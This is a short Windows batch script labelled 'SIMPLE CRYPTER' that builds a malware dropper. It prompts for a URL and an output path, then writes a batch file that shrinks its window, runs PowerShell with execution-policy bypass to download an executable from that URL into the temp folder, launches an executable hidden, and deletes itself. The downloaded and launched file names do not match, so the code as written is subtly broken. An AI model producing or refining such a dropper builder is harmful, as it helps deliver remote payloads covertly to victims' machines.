@echo off
chcp 65001 > nul
color 3

echo SIMPLE CRYPTER

set /p URL=link: 
set /p SAVE_PATH=where need a save(C:\Users\User\Desktop\run.bat): 

(
    echo mode 15,1
    echo @echo off
    echo powershell.exe -ep bypass -Command Invoke-WebRequest -Uri "%URL%" -OutFile "$env:temp\TEMPBUILD.exe"; Start-Process -FilePath "$env:temp\LNKBUILD.exe" -WindowStyle Hidden
    echo del %%0
) > "%SAVE_PATH%"

echo file save in: %SAVE_PATH%
pause
